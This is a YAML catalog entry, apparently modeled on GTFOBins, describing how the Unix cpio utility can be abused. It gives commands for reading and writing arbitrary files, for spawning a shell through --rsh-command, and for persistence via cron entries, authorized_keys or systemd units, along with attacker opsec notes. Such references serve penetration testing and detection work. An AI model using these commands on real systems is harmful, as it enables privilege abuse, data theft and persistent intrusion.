---
name: cpio
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: echo /path/to/input-file | cpio -o
  notes: The content of the file is printed to standard output, between the `cpio` archive format header and footer.
- id: file-read-2
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    echo /path/to/input-file | cpio -R $UID -dp .
    cat path/to/input-file
  notes: The whole directory structure is copied to `.`, hence this is also a file write.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file
    echo /path/to/temp-file | cpio -R 0:0 -udp .
  notes: The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '/bin/sh </dev/tty >/dev/tty' >localhost
    cpio -o --rsh-command /bin/sh -F localhost:
references:
- https://gtfobins.github.io/gtfobins/cpio/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
